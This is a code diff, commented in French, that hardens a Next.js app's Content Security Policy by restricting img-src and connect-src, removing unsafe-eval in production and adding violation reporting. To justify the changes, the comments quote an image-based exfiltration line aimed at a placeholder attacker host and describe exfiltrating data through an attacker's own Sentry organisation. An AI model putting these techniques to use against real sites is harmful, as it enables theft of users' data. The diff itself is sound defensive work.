@@ -136,19 +136,61 @@ export const CSRF_EXEMPT_PREFIXES = ['/api/auth'];
 // ── N3 + N4 : headers de securite appliques a TOUTES les reponses ────────────
 // Avant, seul NextResponse.next() les recevait : les 429, 403 et la redirection
 // login partaient sans nosniff, sans HSTS, sans X-Frame-Options.
+// ── CSP (S26 - durcissement) ─────────────────────────────────────────────────
+// Option B retenue (S26) : 'unsafe-inline' conserve sur script-src et
+// style-src. Une CSP a nonce imposerait un nonce par requete, donc le rendu
+// dynamique de TOUTES les pages aujourd'hui statiques : cout de performance
+// reel pour un gain limite ici (React echappe tout, aucun HTML tiers affiche).
+// La valeur de cette CSP est ailleurs : anti-exfiltration (connect-src,
+// img-src), anti-clickjacking (frame-ancestors), object-src, base-uri,
+// form-action.
+//
+// Durcissements S26 :
+//  - 'unsafe-eval' retire en production : seul le webpack de dev en a besoin.
+//  - img-src : `https:` retire. Il ouvrait un canal d'exfiltration
+//    (new Image().src = 'https://attaquant/?d=...') qui contournait
+//    entierement la restriction de connect-src.
+//  - connect-src : les wildcards *.ingest.*.sentry.io autorisaient N'IMPORTE
+//    QUELLE organisation Sentry. Un attaquant peut ouvrir la sienne et y
+//    exfiltrer des donnees en passant la CSP (contournement classique des
+//    domaines SaaS partages). Epingle sur l'hote exact de l'organisation,
+//    deduit de CSP_REPORT_URI (meme hote que l'ingestion) ; a defaut, repli
+//    sur la seule region DE, celle de l'organisation lawdigitals.
+//  - report-uri : sans lui, le mode Report-Only n'ecrivait que dans la
+//    console de chaque navigateur, personne ne collectait les violations.
+//    CSP_REPORT_URI = URL fournie par Sentry (Project Settings > Security
+//    Headers). Absente => pas de report-uri, comportement anterieur conserve.
+//
+// Evalue une seule fois par isolate : les variables d'environnement ne
+// changent qu'avec un redeploiement.
+function origineDe(url: string | undefined): string | null {
+  if (!url) return null;
+  try {
+    return new URL(url).origin;
+  } catch {
+    return null;
+  }
+}
+
+const CSP_REPORT_URI = process.env.CSP_REPORT_URI;
+const HOTE_SENTRY    = origineDe(CSP_REPORT_URI) ?? 'https://*.ingest.de.sentry.io';
+
 const CSP_DIRECTIVES = [
   "default-src 'self'",
   "base-uri 'self'",
   "object-src 'none'",
   "frame-ancestors 'self'",
   "form-action 'self'",
-  "img-src 'self' data: blob: https:",
+  "img-src 'self' data: blob:",
   "font-src 'self' data:",
   "style-src 'self' 'unsafe-inline'",
-  "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
-  "connect-src 'self' https://*.ingest.sentry.io https://*.ingest.de.sentry.io https://*.ingest.us.sentry.io",
+  IS_PROD
+    ? "script-src 'self' 'unsafe-inline'"
+    : "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
+  "connect-src 'self' " + HOTE_SENTRY,
   "worker-src 'self' blob:",
   "manifest-src 'self'",
+  ...(CSP_REPORT_URI ? ['report-uri ' + CSP_REPORT_URI] : []),
 ].join('; ');
 
 export function withSecurityHeaders(res: NextResponse): NextResponse {
